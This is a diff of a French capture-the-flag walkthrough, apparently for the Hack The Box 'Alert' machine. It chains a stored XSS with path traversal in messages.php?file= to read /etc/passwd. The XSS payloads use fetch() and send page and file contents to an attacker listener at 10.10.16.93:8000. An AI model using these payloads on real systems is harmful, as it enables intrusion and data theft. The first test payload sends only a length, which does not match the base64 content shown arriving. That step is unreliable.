@@ -676,25 +676,112 @@ Tu es donc parvenu à faire exécuter ton code dans le navigateur de l’adminis
 
 ### Exfiltration de contenu avec JavaScript
 
-Une fois le XSS confirmé, on peut aller plus loin que de simples alertes.
+Concrètement, l’idée est d’utiliser le navigateur de l’administrateur pour afficher des pages auxquelles toi tu n’as pas accès.
 
-L’idée est d’utiliser JavaScript pour :
+Puisque ton code JavaScript s’exécute dans son navigateur, tu peux lui faire ouvrir ces pages à ta place. Le contenu s’affiche alors dans son navigateur, avec ses droits.
 
-1. envoyer une requête vers une ressource interne
-2. récupérer son contenu
-3. l’exfiltrer vers notre machine
+Ton code peut ensuite lire ce contenu, puis l’envoyer vers ta machine.
 
-Un premier test consiste à récupérer la page suivante :
+L’objectif est donc de trouver une page intéressante à cibler afin de faire apparaître des fichiers sensibles dans le navigateur de l’administrateur.
 
-```
-http://alert.htb/messages.php
-```
+#### Recherche d’une page intéressante à exploiter
 
-Payload utilisé :
+Pour avancer, tu dois maintenant identifier une page de l’application qui pourrait afficher des fichiers ou du contenu intéressant.
 
-```
+Lors de la phase d’énumération, tu as découvert plusieurs pages.
+
+L’objectif est ici de repérer une fonctionnalité qui affiche du contenu dynamique, en particulier des fichiers, car ce type de fonctionnalité peut permettre d’accéder à des informations sensibles.
+
+Parmi les pages identifiées, `messages.php` attire l’attention, car son nom suggère qu’elle pourrait afficher du contenu stocké côté serveur.
+
+#### Utilisation de `fetch()` pour lire une page
+
+Tu dois maintenant trouver comment faire afficher un fichier dans le navigateur de l’administrateur, puis en récupérer le contenu.
+
+Pour cela, tu peux utiliser `fetch()`. En JavaScript, `fetch()` permet d’envoyer une requête HTTP vers une URL et de récupérer la réponse renvoyée par le serveur. Tu peux le voir comme un `curl` exécuté directement depuis le navigateur.
+
+Dans ton cas, l’idée est la suivante :
+
+1. faire ouvrir une page de l’application dans le navigateur de l’administrateur ;
+2. récupérer ce que cette page affiche ;
+3. envoyer ces informations vers ta machine Kali.
+
+#### Premiers essais avec `fetch()`
+
+Une première étape consiste à vérifier que tu peux appeler la page `messages.php` depuis le navigateur de l’administrateur, puis récupérer le contenu qu’elle renvoie.
+
+Pour cela, crée un fichier `fetch-test.md` avec le contenu suivant :
+
+```markdown
+# Test fetch
+
 <script>
 fetch('http://alert.htb/messages.php')
+  .then(r => r.text())
+  .then(data => {
+    new Image().src = 'http://10.10.16.93:8000/?ok=' + data.length;
+  })
+  .catch(err => {
+    new Image().src = 'http://10.10.16.93:8000/?err=1';
+  });
+</script>
+```
+
+Ce code fonctionne en plusieurs étapes :
+
+- `fetch()` appelle la page `messages.php`
+- `.then(r => r.text())` récupère le contenu renvoyé par le serveur
+- `new Image().src` envoie ce contenu vers ta machine Kali
+
+Tu peux ensuite uploader ce fichier, générer un lien avec **“Share Markdown”**, puis l’envoyer via la page **Contact us**.
+
+Dans ton terminal Kali, tu observes alors une requête entrante contenant le résultat renvoyé par la page :
+
+```bash
+10.129.231.188 - - [27/Mar/2026 17:07:00] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
+```
+
+Le contenu est encodé en Base64. Tu peux le décoder avec la commande suivante :
+
+```bash
+echo "PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg==" | base64 -d
+```
+
+Tu obtiens alors le contenu HTML suivant :
+
+```html
+<h1>Messages</h1>
+<ul>
+  <li>
+    <a href='messages.php?file=2024-03-10_15-48-34.txt'>
+      2024-03-10_15-48-34.txt
+    </a>
+  </li>
+</ul>
+```
+
+Ce résultat montre que la page `messages.php` affiche une liste de fichiers disponibles, avec des liens utilisant le paramètre `file`.
+
+Ces informations ne sont pas visibles pour un utilisateur standard, mais deviennent accessibles lorsqu’elles sont récupérées depuis le navigateur de l’administrateur.
+
+On dispose désormais d’un point d’entrée clair pour lire des fichiers via :
+
+```bash
+messages.php?file=...
+```
+
+#### Confirmation de la lecture d’un fichier
+
+Maintenant que tu sais que la page `messages.php` permet d’afficher des fichiers via le paramètre `file`, tu peux vérifier s’il est possible de lire un fichier système.
+
+Pour cela, crée un fichier `fetch-files.md` avec le contenu suivant :
+
+
+```markdown
+# Fetch files
+
+<script>
+fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
   .then(r => r.text())
   .then(data => {
     new Image().src = 'http://10.10.16.93:8000/?d=' + btoa(data);
@@ -702,14 +789,25 @@ fetch('http://alert.htb/messages.php')
 </script>
 ```
 
-👉 Explication :
+Ce code demande au navigateur de l’administrateur d’ouvrir le fichier `/etc/passwd`, puis d’envoyer son contenu vers ta machine Kali.
 
-- `fetch()` récupère le contenu de la page
-- `r.text()` convertit la réponse en texte
-- `btoa()` encode les données en base64
-- `new Image().src` envoie les données vers notre serveur
+Dans ton terminal, tu observes alors une nouvelle requête contenant les données encodées.
 
-Lorsque l’administrateur charge la page piégée, une requête est envoyée vers notre machine contenant les données récupérées.
+Après décodage, tu obtiens le contenu du fichier `/etc/passwd`, par exemple :
+
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+Cela confirme que :
+
+- le paramètre `file` permet de lire des fichiers arbitraires
+- cette lecture est effectuée avec les droits de l’administrateur
+- il est possible d’exfiltrer le contenu de ces fichiers vers ta machine
+
+Tu es donc en présence d’une vulnérabilité de type **Local File Inclusion (LFI)** exploitable via la XSS.
 
 ------
 
